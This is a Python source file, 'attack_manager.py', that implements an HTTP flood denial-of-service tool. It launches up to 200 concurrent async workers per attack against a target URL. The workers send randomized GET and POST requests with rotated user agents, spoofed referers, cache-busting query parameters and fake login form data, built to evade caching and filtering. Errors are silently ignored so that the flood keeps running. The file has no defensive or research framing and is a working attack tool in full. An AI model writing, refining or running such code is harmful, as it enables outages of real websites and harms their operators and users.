# attack_manager.py - FIXED VERSION
import threading
import time
import random
import string
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import uuid

class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.total_requests = 0
        self.start_time = time.time()
        self.executor = ThreadPoolExecutor(max_workers=500)
        self.lock = threading.Lock()
        
    def generate_random_user_agent(self):
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]
        return random.choice(agents)
    
    def generate_random_referer(self, target_url):
        referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.reddit.com/',
            target_url
        ]
        return random.choice(referers)
    
    async def http_flood_worker(self, target_url, attack_id, stop_event):
        session_timeout = aiohttp.ClientTimeout(total=5)
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        
        async with aiohttp.ClientSession(timeout=session_timeout, connector=connector) as session:
            while not stop_event.is_set():
                try:
                    # Randomize everything
                    method = random.choice(['GET', 'POST'])
                    
                    # Add random query params
                    random_params = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
                    if '?' in target_url:
                        attack_url = f"{target_url}&_{random_params}={int(time.time())}"
                    else:
                        attack_url = f"{target_url}?_{random_params}={int(time.time())}"
                    
                    headers = {
                        'User-Agent': self.generate_random_user_agent(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'max-age=0',
                        'Referer': self.generate_random_referer(target_url)
                    }
                    
                    if method == 'POST':
                        # Generate random form data
                        post_data = {
                            'username': ''.join(random.choices(string.ascii_letters, k=8)),
                            'password': ''.join(random.choices(string.ascii_letters + string.digits, k=12)),
                            'email': f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                            'csrf_token': ''.join(random.choices(string.hexdigits, k=32))
                        }
                        async with session.post(attack_url, headers=headers, data=post_data) as resp:
                            await resp.read()
                    else:
                        async with session.get(attack_url, headers=headers) as resp:
                            await resp.read()
                    
                    with self.lock:
                        self.total_requests += 1
                    
                    # Small delay to avoid overwhelming local machine
                    await asyncio.sleep(random.uniform(0.05, 0.2))
                    
                except Exception as e:
                    # Silent fail, continue attacking
                    continue
    
    def launch_attack(self, target_url, threads=100, duration=60, attack_type='http_flood'):
        attack_id = str(uuid.uuid4())[:8]
        stop_event = threading.Event()
        
        def run_attack():
            asyncio.run(self._attack_controller(target_url, attack_id, stop_event, threads, duration))
        
        attack_thread = threading.Thread(target=run_attack, daemon=True)
        attack_thread.start()
        
        self.active_attacks[attack_id] = {
            'target': target_url,
            'threads': threads,
            'duration': duration,
            'start_time': time.time(),
            'stop_event': stop_event,
            'thread': attack_thread
        }
        
        return attack_id
    
    async def _attack_controller(self, target_url, attack_id, stop_event, threads, duration):
        tasks = []
        for _ in range(min(threads, 200)):  # Max 200 threads untuk safety
            task = asyncio.create_task(
                self.http_flood_worker(target_url, attack_id, stop_event)
            )
            tasks.append(task)
        
        # Run for duration seconds
        await asyncio.sleep(duration)
        stop_event.set()
        
        # Wait for all tasks to complete
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except:
            pass
        
        # Cleanup
        if attack_id in self.active_attacks:
            del self.active_attacks[attack_id]
    
    def stop_attack(self, attack_id):
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id]['stop_event'].set()
            time.sleep(0.5)
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
            return True
        return False
    
    def get_active_count(self):
        return len(self.active_attacks)
    
    def get_all_stats(self):
        attacks_info = []
        for aid, info in self.active_attacks.items():
            attacks_info.append({
                'id': aid,
                'target': info['target'],
                'elapsed': time.time() - info['start_time'],
                'threads': info['threads'],
                'remaining': max(0, info['duration'] - (time.time() - info['start_time']))
            })
        
        return {
            'active_attacks': attacks_info,
            'total_requests': self.total_requests,
            'uptime': time.time() - self.start_time
      }
